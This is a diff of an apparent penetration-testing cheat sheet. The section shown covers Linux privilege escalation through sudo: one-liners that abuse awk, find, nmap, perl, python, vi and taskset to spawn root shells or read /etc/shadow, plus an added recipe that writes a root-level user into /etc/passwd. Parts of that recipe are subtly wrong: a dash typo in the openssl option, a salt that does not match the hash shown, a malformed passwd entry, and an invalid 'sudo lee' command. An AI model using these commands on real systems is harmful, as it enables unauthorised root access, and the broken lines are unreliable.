@@ -162,7 +162,7 @@ lynis audit system remote <target IP>
 - sudoers
 sudo -l                                   Check for binaries that can be ran with root privs
 
-- Abuse binaries
+- Abuse binaries.
 sudo apache2 -f /etc/shadow               View a system file.
 sudo awk 'BEGIN {system("/bin/bash")}'
 sudo find /home -exec /bin/bash \;
@@ -172,6 +172,7 @@ sudo more /etc/hosts                      !bash and hit enter
 echo "os.execute('/bin/bash')" > test.nse && sudo nmap --script=test.nse
 sudo perl -e 'exec "/bin/bash";'
 sudo python -c 'import pty;pty.spawn("/bin/bash")'
+sudo taskset 1 /bin/sh -p
 sudo vi
 
 - Add a user to sudoers.
@@ -480,6 +481,13 @@ groupdel                             Delete group
 groupmod                             Modify group
 
 adduser <user> <group>               Add user to group
+
+- Create a password hash for a new user lee with a password of pass123.
+openssl passwd -1 –salt lee pass123
+Use echo and taskset (part of sudoers) to add the new user with root privileges to /etc/passwd.
+taskset 1 echo 'lee:$1$mark$PL9HIgTDwnE9sG27q2Nrb/:0:0:root/:root:/bin/bash' >>/etc/passwd
+sudo lee
+id
 ------------------------------------------------------------------------------------------------------
 
 # Video resolution
